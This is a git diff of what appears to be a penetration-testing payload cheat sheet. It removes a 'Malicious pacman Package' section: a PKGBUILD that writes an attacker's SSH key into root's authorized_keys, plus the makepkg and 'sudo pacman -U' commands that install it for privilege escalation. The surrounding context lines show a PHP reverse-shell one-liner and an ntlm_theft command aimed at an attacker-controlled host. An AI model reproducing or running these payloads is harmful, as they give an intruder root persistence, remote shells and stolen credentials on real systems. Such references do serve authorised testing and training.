@@ -34,7 +34,6 @@
 - [Nishang](#nishang)
 - [Non-alphanumeric Webshell](#non-alphanumeric-webshell)
 - [ntlm_theft](#ntml_theft)
-- [pacman](#pacman)
 - [PDF](#pdf)
 - [Perl Reverse Shell](#perl-reverse-shell)
 - [PHP popen Web Shell](#php-popen-web-shell)
@@ -738,51 +737,6 @@ $ echo -ne '<?=`{${~\xa0\xb8\xba\xab}[\xa0]}`;' > rev_shell.php
 
 ```c
 $ python3 ntlm_theft.py --generate all --server <RHOST> --filename <FOLDER>
-```
-
-## pacman
-
-### Malicious pacman Package
-
-#### Custom PKGBUILD Package
-
-```c
-pkgname=malicious_pkg
-pkgver=1.0
-pkgrel=1
-pkgdesc="Malicious package for privilege escalation"
-arch=('x86_64')
-url="https://example.com"
-license=('GPL')
-depends=()
-source=()
-md5sums=()
-
-package() {
-    # Malicious command executed as root
-    mkdir -p "${pkgdir}/root/.ssh"
-    echo "<SSH_KEY>" > "${pkgdir}/root/.ssh/authorized_keys"
-    chmod 700 "${pkgdir}/root/.ssh"
-    chmod 600 "${pkgdir}/root/.ssh/authorized_keys"
-}
-```
-
-#### Set Permissions
-
-```c
-$ chmod 644 PKGBUILD
-```
-
-#### Build Packages
-
-```c
-$ makepkg --force --noextract --nodeps
-```
-
-#### Execute pacman
-
-```c
-$ sudo /usr/bin/pacman -U ./malicious_pkg-1.0-1-x86_64.pkg.tar.zst 
 ```
 
 ## PDF
